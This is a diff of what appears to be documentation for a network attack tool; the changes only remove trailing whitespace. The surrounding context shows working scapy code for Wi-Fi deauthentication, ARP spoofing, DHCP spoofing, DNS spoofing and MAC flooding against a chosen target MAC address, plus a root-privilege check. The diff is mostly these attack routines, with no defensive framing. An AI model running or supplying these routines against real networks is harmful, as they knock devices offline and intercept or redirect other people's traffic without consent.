@@ -100,7 +100,7 @@ def check_permissions(self) -> bool:
         # Check if running as root
         if os.geteuid() == 0:
             return True
-            
+
         # On Linux, check for NET_RAW capability
         if sys.platform == "linux":
             with open("/proc/self/status") as f:
@@ -110,7 +110,7 @@ def check_permissions(self) -> bool:
                         # NET_RAW is capability 13
                         if (cap_eff >> 13) & 1:
                             return True
-                            
+
         return False
     except Exception:
         return False
@@ -141,7 +141,7 @@ async def _run_kick_attack(self, target_mac: str, duration: int):
         )
         / Dot11Deauth(reason=7)
     )
-    
+
     # Send in bursts
     while time.time() < end_time:
         await asyncio.to_thread(
@@ -177,7 +177,7 @@ async def _run_block_attack(self, target_mac: str, duration: int):
     """Execute ARP Spoofing attack."""
     gateway_ip = conf.route.route("0.0.0.0")[2]
     my_mac = get_if_hwaddr(conf.iface)
-    
+
     # Craft ARP reply
     packet = (
         Ether(dst=target_mac, src=my_mac)
@@ -189,7 +189,7 @@ async def _run_block_attack(self, target_mac: str, duration: int):
             hwsrc=my_mac          # Our MAC (spoofed)
         )
     )
-    
+
     # Send continuously
     while time.time() < end_time:
         await asyncio.to_thread(sendp, packet, iface=iface)
@@ -250,7 +250,7 @@ async def _run_dhcp_spoof_attack(self, target_mac: str, duration: int):
                 ])
             )
             sendp(offer, iface=iface, verbose=False)
-    
+
     # Sniff and respond
     sniff(filter="udp and port 67", prn=handle_dhcp, timeout=duration)
 ```
@@ -267,7 +267,7 @@ async def _run_dhcp_spoof_attack(self, target_mac: str, duration: int):
 async def _run_dns_spoof_attack(self, target_mac: str, duration: int):
     """Execute DNS Spoofing attack."""
     redirect_ip = "127.0.0.1"  # Redirect target
-    
+
     def handle_dns(packet):
         if DNS in packet and packet[DNS].qr == 0:  # Query
             # Create spoofed response
@@ -288,7 +288,7 @@ async def _run_dns_spoof_attack(self, target_mac: str, duration: int):
                 )
             )
             sendp(spoofed, iface=iface, verbose=False)
-    
+
     sniff(filter="udp and port 53", prn=handle_dns, timeout=duration)
 ```
 
@@ -304,19 +304,19 @@ async def _run_dns_spoof_attack(self, target_mac: str, duration: int):
 async def _run_mac_flood_attack(self, target_mac: str, duration: int):
     """Execute MAC Flooding attack."""
     import random
-    
+
     while time.time() < end_time:
         # Generate random MAC
         fake_mac = ":".join([
             f"{random.randint(0, 255):02x}" for _ in range(6)
         ])
-        
+
         # Send packet with fake source
         flood_packet = (
             Ether(src=fake_mac, dst=target_mac)
             / IP() / ICMP()
         )
-        
+
         await asyncio.to_thread(sendp, flood_packet, iface=iface)
         await asyncio.sleep(0.01)  # 100 pps
 ```
